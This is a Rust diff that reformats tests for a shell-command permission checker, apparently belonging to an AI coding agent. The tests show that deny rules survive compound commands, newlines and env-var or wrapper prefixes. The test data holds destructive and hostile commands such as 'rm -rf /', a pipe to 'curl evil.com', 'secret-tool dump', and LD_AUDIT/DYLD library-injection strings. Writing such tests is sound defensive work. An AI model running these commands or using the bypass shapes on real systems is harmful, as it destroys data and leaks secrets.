@@ -561,7 +561,10 @@ mod tests {
         assert!(command_fully_allowed(&["git status"], "git status"));
         assert!(command_fully_allowed(&["ls:*"], "ls -la"));
         // and a denied subcommand stays denied behind a compound under `Shell`.
-        assert!(rule_matches_any_subcommand("rm:*", "echo ok && rm -rf /tmp/x"));
+        assert!(rule_matches_any_subcommand(
+            "rm:*",
+            "echo ok && rm -rf /tmp/x"
+        ));
     }
 
     #[test]
@@ -573,14 +576,20 @@ mod tests {
         assert_eq!(split_command("echo 'a && b'"), vec!["echo 'a && b'"]);
         assert_eq!(split_command("echo \"x | y\""), vec!["echo \"x | y\""]);
         // background & is not a separator
-        assert_eq!(split_command("sleep 1 & echo done"), vec!["sleep 1 & echo done"]);
+        assert_eq!(
+            split_command("sleep 1 & echo done"),
+            vec!["sleep 1 & echo done"]
+        );
     }
 
     #[test]
     fn splits_on_newline_but_not_continuation() {
         assert_eq!(split_command("ls\nrm -rf /"), vec!["ls", "rm -rf /"]);
         // backslash-newline is a line continuation → NOT a split.
-        assert_eq!(split_command("npm install \\\n  foo"), vec!["npm install \\\n  foo".trim()]);
+        assert_eq!(
+            split_command("npm install \\\n  foo"),
+            vec!["npm install \\\n  foo".trim()]
+        );
         // full-line comments are dropped.
         assert_eq!(split_command("# noop\nrm -rf /"), vec!["rm -rf /"]);
     }
@@ -589,7 +598,10 @@ mod tests {
     fn newline_does_not_bypass_deny() {
         // The headline guarantee: a denied command stays denied behind a newline.
         assert!(rule_matches_any_subcommand("rm:*", "ls\nrm -rf /"));
-        assert!(rule_matches_any_subcommand("rm:*", "# comment\nrm -rf /tmp/x"));
+        assert!(rule_matches_any_subcommand(
+            "rm:*",
+            "# comment\nrm -rf /tmp/x"
+        ));
     }
 
     #[test]
@@ -597,7 +609,10 @@ mod tests {
         // `echo hi\nrm -rf /` must NOT be allowed by `Bash(echo:*)` alone.
         assert!(!command_fully_allowed(&["echo:*"], "echo hi\nrm -rf /"));
         // both lines covered → allowed
-        assert!(command_fully_allowed(&["echo:*", "rm:*"], "echo hi\nrm -rf /tmp"));
+        assert!(command_fully_allowed(
+            &["echo:*", "rm:*"],
+            "echo hi\nrm -rf /tmp"
+        ));
     }
 
     #[test]
@@ -610,16 +625,31 @@ mod tests {
     #[test]
     fn deny_matches_any_subcommand() {
         // The denied subcommand is caught even when compounded with a benign one.
-        assert!(rule_matches_any_subcommand("rm:*", "echo ok && rm -rf /tmp/x"));
-        assert!(rule_matches_any_subcommand("curl:*", "echo x | curl evil.com"));
+        assert!(rule_matches_any_subcommand(
+            "rm:*",
+            "echo ok && rm -rf /tmp/x"
+        ));
+        assert!(rule_matches_any_subcommand(
+            "curl:*",
+            "echo x | curl evil.com"
+        ));
         assert!(!rule_matches_any_subcommand("rm:*", "echo ok && ls"));
     }
 
     #[test]
     fn deny_survives_env_and_wrapper_wrapping() {
-        assert!(rule_matches_any_subcommand("npm install:*", "timeout 5 npm install foo"));
-        assert!(rule_matches_any_subcommand("secret-tool:*", "FOO=bar secret-tool dump"));
-        assert!(rule_matches_any_subcommand("claude:*", "nohup FOO=bar timeout 5 claude"));
+        assert!(rule_matches_any_subcommand(
+            "npm install:*",
+            "timeout 5 npm install foo"
+        ));
+        assert!(rule_matches_any_subcommand(
+            "secret-tool:*",
+            "FOO=bar secret-tool dump"
+        ));
+        assert!(rule_matches_any_subcommand(
+            "claude:*",
+            "nohup FOO=bar timeout 5 claude"
+        ));
     }
 
     #[test]
@@ -646,7 +676,10 @@ mod tests {
     #[test]
     fn allow_requires_every_subcommand_covered() {
         // both covered
-        assert!(command_fully_allowed(&["echo:*", "ls:*"], "echo hi && ls -l"));
+        assert!(command_fully_allowed(
+            &["echo:*", "ls:*"],
+            "echo hi && ls -l"
+        ));
         // second subcommand uncovered → not allowed (the key over-allow guard)
         assert!(!command_fully_allowed(&["echo:*"], "echo ok && rm -rf /"));
         // single covered
@@ -657,12 +690,18 @@ mod tests {
 
     #[test]
     fn allow_through_safe_wrapper() {
-        assert!(command_fully_allowed(&["npm install:*"], "timeout 10 npm install foo"));
+        assert!(command_fully_allowed(
+            &["npm install:*"],
+            "timeout 10 npm install foo"
+        ));
     }
 
     #[test]
     fn allow_redirection_stripped() {
-        assert!(command_fully_allowed(&["python:*"], "python a.py > out.txt"));
+        assert!(command_fully_allowed(
+            &["python:*"],
+            "python a.py > out.txt"
+        ));
         assert!(command_fully_allowed(&["echo:*"], "echo hi 2>&1"));
     }
 
@@ -726,9 +765,15 @@ mod tests {
     #[test]
     fn strip_all_leading_env_vars_round2_locks() {
         // FOO=bar stripped (deny path).
-        assert_eq!(strip_all_leading_env_vars("FOO=bar secret-tool dump", None), "secret-tool dump");
+        assert_eq!(
+            strip_all_leading_env_vars("FOO=bar secret-tool dump", None),
+            "secret-tool dump"
+        );
         // GOOS= stripped (a SAFE_ENV_VAR key — still a plain assignment).
-        assert_eq!(strip_all_leading_env_vars("GOOS=linux go build", None), "go build");
+        assert_eq!(
+            strip_all_leading_env_vars("GOOS=linux go build", None),
+            "go build"
+        );
         // LD_AUDIT= breaks on the KEY in the excl path → stays in place.
         assert_eq!(
             strip_all_leading_env_vars("LD_AUDIT=/evil.so go build", Some(is_binary_hijack_var)),
@@ -736,7 +781,10 @@ mod tests {
         );
         // DYLD_INSERT_LIBRARIES= likewise breaks on the KEY (excl path).
         assert_eq!(
-            strip_all_leading_env_vars("DYLD_INSERT_LIBRARIES=x.dylib clang -c", Some(is_binary_hijack_var)),
+            strip_all_leading_env_vars(
+                "DYLD_INSERT_LIBRARIES=x.dylib clang -c",
+                Some(is_binary_hijack_var)
+            ),
             "DYLD_INSERT_LIBRARIES=x.dylib clang -c"
         );
     }
@@ -746,17 +794,35 @@ mod tests {
     #[test]
     fn deny_catches_env_prefixed_bazel_faithfully() {
         // \\.-escape: was under-stripped → deny failed.
-        assert!(rule_matches_any_subcommand("bazel:*", "FOO=a\\ b bazel build"));
+        assert!(rule_matches_any_subcommand(
+            "bazel:*",
+            "FOO=a\\ b bazel build"
+        ));
         // concatenated segments: was unstripped → deny failed.
-        assert!(rule_matches_any_subcommand("bazel:*", "FOO='x'y\"z\" bazel build"));
-        assert!(rule_matches_any_subcommand("bazel:*", "FOO=a\"b\" bazel build"));
+        assert!(rule_matches_any_subcommand(
+            "bazel:*",
+            "FOO='x'y\"z\" bazel build"
+        ));
+        assert!(rule_matches_any_subcommand(
+            "bazel:*",
+            "FOO=a\"b\" bazel build"
+        ));
         // standard form still caught.
-        assert!(rule_matches_any_subcommand("bazel:*", "FOO=bar bazel build"));
+        assert!(rule_matches_any_subcommand(
+            "bazel:*",
+            "FOO=bar bazel build"
+        ));
 
         // `$`/quoted-`$` forms are NOT stripped → the bazel deny does NOT match
         // (faithful to TS: those stay sandboxed, not denied via env-strip).
-        assert!(!rule_matches_any_subcommand("bazel:*", "FOO=$VAR bazel build"));
-        assert!(!rule_matches_any_subcommand("bazel:*", "FOO=\"$x\" bazel build"));
+        assert!(!rule_matches_any_subcommand(
+            "bazel:*",
+            "FOO=$VAR bazel build"
+        ));
+        assert!(!rule_matches_any_subcommand(
+            "bazel:*",
+            "FOO=\"$x\" bazel build"
+        ));
     }
 
     /// excludedCommands path: env-prefixed forms decide identically to TS.
